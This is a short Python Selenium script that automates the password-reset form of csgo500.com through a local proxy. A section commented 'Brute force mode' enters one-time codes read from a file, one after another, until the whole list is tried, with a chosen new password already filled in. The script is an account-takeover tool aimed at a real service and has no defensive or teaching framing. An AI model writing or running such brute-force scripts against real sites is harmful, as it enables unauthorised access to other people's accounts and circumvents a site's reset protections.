import time
from selenium import webdriver


py = "127.0.0.1:8080"
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--proxy-server=%s' % py)
driver = webdriver.Chrome('./chromedriver',chrome_options=chrome_options)  # Optional argument, if not specified will search path.
driver.get('https://csgo500.com/auth/password-reset');
time.sleep(5)
driver.find_element_by_xpath("/html/body/div[1]/div[6]/div[2]/main/div[2]/div[2]/div/div[1]/div[2]/div/div/div/div/div[3]/div/input").send_keys('@v(54En&PJ')
driver.find_element_by_xpath("/html/body/div[1]/div[6]/div[2]/main/div[2]/div[2]/div/div[1]/div[2]/div/div/div/div/div[4]/div/input").send_keys('@v(54En&PJ')

#Brute force mode
lines = []
with open('otp.txt') as f:
    lines = f.readlines()
for line in lines:

    #code
    driver.find_element_by_xpath("/html/body/div[1]/div[6]/div[2]/main/div[2]/div[2]/div/div[1]/div[2]/div/div/div/div/div[2]/div/input").send_keys(line)
    driver.find_element_by_xpath("/html/body/div[1]/div[6]/div[2]/main/div[2]/div[2]/div/div[1]/div[2]/div/div/div/div/button/span").click()
    time.sleep(1)
    driver.find_element_by_xpath("/html/body/div[1]/div[6]/div[2]/main/div[2]/div[2]/div/div[1]/div[2]/div/div/div/div/div[2]/div/input").clear()
    time.sleep(1)

print("finish")
#driver.quit()